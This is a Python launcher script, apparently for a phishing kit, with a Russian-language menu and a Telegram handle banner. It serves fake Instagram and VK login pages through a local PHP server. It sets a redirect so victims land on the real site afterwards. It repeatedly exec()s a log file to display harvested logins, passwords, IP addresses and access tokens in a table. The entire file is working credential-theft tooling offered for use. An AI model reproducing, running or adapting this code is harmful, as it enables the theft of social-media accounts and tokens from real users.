import os, sys, time
import random
from multiprocessing import Process
from time import sleep
from prettytable import PrettyTable

os.system('clear')
о = open('log.log', 'w')
о.close()
class A:
    def __call__(self, count=10, sleep_time=0.5):
        if used == "1":
            os.system("cd instagram && php -S localhost:"+str(ports))
        elif used == "2":
            os.system("cd vk && php -S localhost:"+str(ports))
        else:
            print("No number '"+used+"'")



class B:
    def __call__(self, count=10, sleep_time=0.5):
        while True:
            import os
            x = PrettyTable()
            x.field_names = ['Ceть', 'Логин', 'Пароль', 'Верно?', 'IP']
            g=0
            exec(open('log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear")

print("""

██████╗░██╗███╗░░██╗░██████╗██╗░░░░░██████╗░░█████╗░
██╔══██╗██║████╗░██║██╔════╝██║░░░░░╚════██╗██╔═══╝░
██████╦╝██║██╔██╗██║╚█████╗░██║░░░░░░█████╔╝██████╗░
██╔══██╗██║██║╚████║░╚═══██╗██║░░░░░░╚═══██╗██╔══██╗
██████╦╝██║██║░╚███║██████╔╝███████╗██████╔╝╚█████╔╝
╚═════╝░╚═╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═════╝░░╚════╝░
                     | t.me/binsl36 |                 
""")
print("""
[0] Nada
[1] Instagram
[2] VK
[3] Social master
[4] Salie
""")
used = input("Введите номер: ")
if used == "0":
    try:
        x = PrettyTable()
        x.field_names = ['Ceть', 'Логин', 'Пароль', 'Верно?', 'IP', 'access_token']
        exec(open('data.log').read())
        print(x)
        exit()
    except:
        exit()
elif used == "3":
    os.system("python3 social.py")
    exit()
elif used == '4':
    os.system('clear')
    print("""
██████╗░██╗███╗░░██╗░██████╗██╗░░░░░██████╗░░█████╗░
██╔══██╗██║████╗░██║██╔════╝██║░░░░░╚════██╗██╔═══╝░
██████╦╝██║██╔██╗██║╚█████╗░██║░░░░░░█████╔╝██████╗░
██╔══██╗██║██║╚████║░╚═══██╗██║░░░░░░╚═══██╗██╔══██╗
██████╦╝██║██║░╚███║██████╔╝███████╗██████╔╝╚█████╔╝
╚═════╝░╚═╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═════╝░░╚════╝░
                     | t.me/binsl36 | 
>>> Bye!
    """)
    exit()
ports = input("Порт: ")
reloc = input("Редирект: ")
if reloc != "":
    if used == "1":
        f = open("instagram/location.location", 'w')
        f.write(reloc)
        f.close()
    elif used == "2":
        f = open("vk/location.location", 'w')
        f.write(reloc)
        f.close()
    else:
        pass
else:
    if used ==  "1":
        f = open("instagram/location.location", 'w')
        f.write("https://instagram.com")
        f.close()
    elif used == "2":
        f = open("vk/location.location", 'w')
        f.write("https://vk.com")
        f.close()
    else:
        f = open("vk/location.location", 'w')
        f.write("https://google.com")
        f.close()
        f = open("instagram/location.location", 'w')
        f.write("https://google.com")
        f.close()
if ports == "":
    ports=8080
if __name__ == '__main__':
    a = A()
    b = B()

    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
    p2 = Process(target=b, args=(12,))
    p1.start()
    p2.start()

    p1.join()
    p2.join()
